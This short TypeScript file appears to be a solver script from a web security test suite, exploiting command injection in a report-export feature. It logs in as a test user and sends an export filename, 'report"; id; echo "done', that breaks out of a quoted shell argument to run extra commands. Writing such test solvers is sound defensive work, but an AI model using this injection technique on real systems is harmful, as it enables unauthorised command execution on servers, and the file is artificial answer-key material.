// Argument break-out in report export: choose an export filename that closes the quoted argument and
// appends extra commands, so the archiver line parses as more than the single intended command.
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const owner = await ctx.login('persona_a')
  await ctx.fetch(ctx.path('exportReport'), {
    method: 'POST',
    session: owner,
    body: { name: 'report"; id; echo "done' },
  })
}
